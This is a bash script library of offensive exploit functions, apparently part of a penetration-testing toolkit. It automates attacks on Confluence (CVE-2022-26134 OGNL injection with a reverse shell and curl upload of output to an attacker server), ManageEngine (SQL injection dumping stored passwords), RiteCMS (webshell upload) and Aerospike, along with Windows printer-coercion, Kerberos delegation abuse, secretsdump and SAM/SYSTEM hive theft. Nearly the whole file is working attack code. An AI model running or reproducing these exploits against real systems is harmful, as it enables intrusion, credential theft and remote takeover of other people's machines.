#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/project.sh"
source "$SCRIPTDIR/general.sh"

perform_cve_2022_26134() {

    local confluence_port=$1
    local confluence_ip=$2
    if [ -z "$counter" ]; then
        counter=0
    fi
    counter=$((counter + 1))
    if [ -z "$confluence_port" ]; then
        confluence_port=8090
    fi
    if [ -z "$confluence_ip" ]; then
        confluence_ip="$ip"
    fi
    if [ -z "$cmd" ]; then
        cmd=$(get_bash_reverse_shell basic)    
    fi  
    if [[ ! -z "$output_cmd" ]] && [[ "$output_cmd" == "yes" ]] && [[ ! -z "$http_port" ]] && [[ ! -z "$http_ip" ]]; then
        if [ -f "log/output$counter" ]; then
            rm -f log/output$counter
        fi
        cmd=$cmd' &> /tmp/output'$counter'; curl -T /tmp/output'$counter' http://'$http_ip:$http_port'/log/output'$counter
    fi
    echo "$cmd" | tee -a "$trail_log"
    local ognl="\${new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"new java.lang.ProcessBuilder().command('bash','-c','$cmd').start()\")}"
    echo "OGNL: $ognl" | tee -a $trail_log
    ognl=$(urlencode_noslash "$ognl")
    echo "OGNL payload: $ognl" | tee -a $trail_log
    curl -v http://$confluence_ip:$confluence_port/$ognl/ 2>&1 | tee -a $trail_log
}

perform_ms_rprn() {

    #local coerce_poc='https://raw.githubusercontent.com/p0dalirius/windows-coerced-authentication-methods/refs/heads/master/methods/MS-PAR%20-%20Print%20System%20Asynchronous%20Remote%20Protocol/00.%20Remote%20call%20to%20RpcAsyncOpenPrinter%20(opnum%200)/coerce_poc.py'
    local coerce_poc='https://raw.githubusercontent.com/p0dalirius/windows-coerced-authentication-methods/refs/heads/master/methods/MS-RPRN%20-%20Print%20System%20Remote%20Protocol/65.%20Remote%20call%20to%20RpcRemoteFindFirstPrinterChangeNotificationEx%20(opnum%2065)/coerce_poc.py'

    if [[ ! -f "coerce_poc.py" ]]; then
        echo "Downloading MS-RPRN Coerce PoC..."
        wget $coerce_poc -O coerce_poc.py    
    fi
    if [[ ! -f "coerce_poc.py" ]]; then
        echo "Failed to download coerce_poc.py. Please check your internet connection."
        return 1
    fi
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running this function."
        return 1
    fi
    if [[ -z "$responder_ip" ]] || [[ -z "$dc_ip" ]]; then
        echo "Responder IP and DC IP must be set before running this function."
        return 1
    fi
    python3 coerce_poc.py -d "$domain" -u "$username" -p "$password" "$responder_ip" "$dc_ip"
}

perform_user_unconstrained_delegation() {
    
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$domain" ]]; then
        echo "username, password and domain must be set before running this function."
        return 1
    fi
    if [[ -z "$kud_username" ]] || [[ -z "$kud_password" ]]; then
        echo "kud_username and kud_password must be set before running this function."
        return 1
    fi
    if [[ -z "$dc_ip" ]] || [[ -z "$dc_hostname" ]]; then
        echo "dc_ip and dc_hostname must be set before running this function."
        return 1
    fi
    echo "Adding the DC hostname and domain to the hosts file..."
    add_host "$dc_hostname" "$dc_ip"
    add_host "$domain" "$dc_ip"
    if [[  ! -f "windows_hashgenerator.py" ]]; then
        echo "Copying windows_hashgenerator.py..."
        cp "$SCRIPTDIR/../python/windows_hashgenerator.py" .
    fi
    if [[ ! -d "krbrelayx" ]]; then
        echo "Cloning krbrelayx repository..."
        git clone https://github.com/dirkjanm/krbrelayx.git
    fi
    if [[ -z "$attacker_ip" ]]; then
        attacker_ip=$(get_host_ip)
    fi
    pushd krbrelayx || exit 1
    if pgrep -f "krbrelayx.py"; then
        echo "krbrelayx is already running, please stop it first."
    else
        ./krbrelayx.py -s "${domain}$kud_username" -p $kud_password -dc-ip $dc_ip 
        return 0
    fi
    ccache_file="$dc_hostname"'$@'$domain'_krbtgt@'$domain'.ccache'
    echo "Checking for ccache file: $ccache_file"
    if [[ -f $ccache_file ]]; then
        echo "Exporting ccache file..."
        export KRB5CCNAME=$(pwd)/$ccache_file
        impacket-secretsdump -just-dc-user jeffadmin -no-pass -k $dc_hostname
    else
        python3 addspn.py -u "$domain\\$username" -p $password  --target-type samname -t "$kud_username" -s 'cifs/attacker.'$domain $dc_ip
        python3 dnstool.py -u "$domain\\$username" -p $password -r "attacker.$domain" -a add -d "$attacker_ip" "$dc_ip"
        python3 printerbug.py "$domain/$username:$password@$dc_hostname" "attacker.$domain"
    fi
    popd || exit 1
}

# For manageengine, see the security updates to ensure the build is vulnerable to the exploit
# https://www.manageengine.com/products/applications_manager/security-updates/security-updates.html
# CVE-2019-11448
perform_cve_2019_11448() {

    if [[ -z "$target_ip" ]]; then
        echo "target_ip is not set, going to use the default $ip"
        target_ip=$ip
    fi
    if [[ ! -z "$appmanager_folder" ]]; then
        echo "Using custom appmanager folder: $appmanager_folder"
    else
        appmanager_folder='C:\Program Files\ManageEngine\AppManager14'
    fi
    if [[ ! -z "$cookie_jar" ]]; then
        echo "Using cookie jar: $cookie_jar"
    else
        cookie_jar="manageengine_cookie.txt"
        echo "Cookie jar is not set. Using default $cookie_jar"        
    fi
    if [[ ! -z "$sql_cmd" ]]; then
        echo "Using custom SQL command: $sql_cmd"
    else
        sql_cmd="copy (select username,password from AM_UserPasswordTable) to $$$appmanager_folder\working\users.txt$$"
    fi
    local cmd="sid=1;$sql_cmd;-- "
    cmd=$(echo "$cmd" | sed 's/ /+/g')
    curl -c $cookie_jar "http://$target_ip:44444/jsp/Popup_SLA.jsp" -d "$cmd"
}

#remote reg save
#when you have backup operators of the domain
#https://github.com/snovvcrash/RemoteRegSave
perform_remote_regsave() {
    git clone https://github.com/snovvcrash/RemoteRegSave.git
    if [[ ! -f "RemoteRegSave/RegSave/bin/Release/RegSave.exe" ]]; then
        echo "RegSave.exe not found, please build it first"
        exit 1
    fi
    generate_windows_download "RemoteRegSave/RegSave/bin/Release/RegSave.exe" "RegSave.exe"
    if [ ! -f "SeBackupPrivilegeUtils.dll" ]; then
        wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true -O SeBackupPrivilegeUtils.dll
    fi
    if [ ! -f "SeBackupPrivilegeCmdLets.dll" ]; then
        wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true -O SeBackupPrivilegeCmdLets.dll
    fi
    generate_windows_download "SeBackupPrivilegeUtils.dll" "SeBackupPrivilegeUtils.dll"
    generate_windows_download "SeBackupPrivilegeCmdLets.dll" "SeBackupPrivilegeCmdLets.dll"
    upload_file "sam.hive"
    upload_file "system.hive"
    upload_file "security.hive"
}

perform_local_regsave() {
    echo 'reg save hklm\sam C:\windows\temp\sam.hive'
    echo 'reg save hklm\system C:\windows\temp\system.hive'
    upload_file "sam.hive"
    upload_file "system.hive"
}

#ritecms
perform_cve_2021_46367() {
    if [[ -z $target_url ]]; then
        target_url=http://$ip/cms
        echo "target_url is not set, going to use the default $target_url"
    fi
    if [[ -z $username ]]; then
        username=admin
        echo "username is not set, going to use the default $username"
    fi
    if [[ -z $password ]]; then
        password=admin
        echo "password is not set, going to use the default $password"
    fi
    if [[ -z $cookie_jar ]]; then
        cookie_jar=ritecms_cookie.txt
        echo "cookie_jar is not set, going to use the default $cookie_jar"
    fi
    local file="webshell.php"
    if [[ -f "$file" ]]; then
        rm $file
    fi
    cp $SCRIPTDIR/../php/webshell.php $file
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    local proxy_option= #"--proxy localhost:8080"
    cmd=$(echo "$cmd" | sed -E 's/"/\\"/g')
    cmd=$(escape_sed "$cmd")
    sed -E -i "s/\{cmd\}/$cmd/g" "$file"
    curl -b $cookie_jar -c $cookie_jar -d "username=$username" -d "userpw=$password" "$target_url/admin.php" $proxy_option
    curl -b $cookie_jar -c $cookie_jar -d "mode=filemanager" -d "delete=../webshell.php" -d "dir=files" -d "confirmed=OK - Delete file" \
        "$target_url/admin.php" $proxy_option
    curl -b $cookie_jar -c $cookie_jar -F "mode=filemanager" -F "file=@$file;filename=$file" -F "directory=files" -F "file_name=../$file" -F "upload_mode=1" \
        -F "upload_file_submit=OK - Upload file" \
        "$target_url/admin.php" $proxy_option

    curl $target_url/webshell.php
}

# aerospike database attack <5.1.0.3
perform_cve_2020_13151() {
    local url="https://github.com/b4ny4n/CVE-2020-13151/archive/refs/heads/master.zip"
    if [[ ! -d "CVE-2020-13151-master" ]]; then
        echo "Downloading CVE-2020-13151 exploit..."
        wget $url -O CVE-2020-13151.zip
        unzip CVE-2020-13151.zip
    fi
    pushd CVE-2020-13151-master || exit 1
    sed -E -i "s/'timeout'/'total_timeout'/g" cve2020-13151.py
    if [[ -z "$target_ip" ]]; then
        target_ip=$ip
        echo "target_ip is not set, going to use the default $target_ip"
    fi
    if [[ -z "$host_ip" ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, going to use the default $host_ip"
    fi
    if [[ -z "$host_port" ]]; then
        host_port=4444
        echo "host_port is not set, going to use the default $host_port"
    fi
    python3 cve2020-13151.py --ahost $target_ip --lhost $host_ip --lport $host_port --cmd "$cmd"
    popd || exit 1
}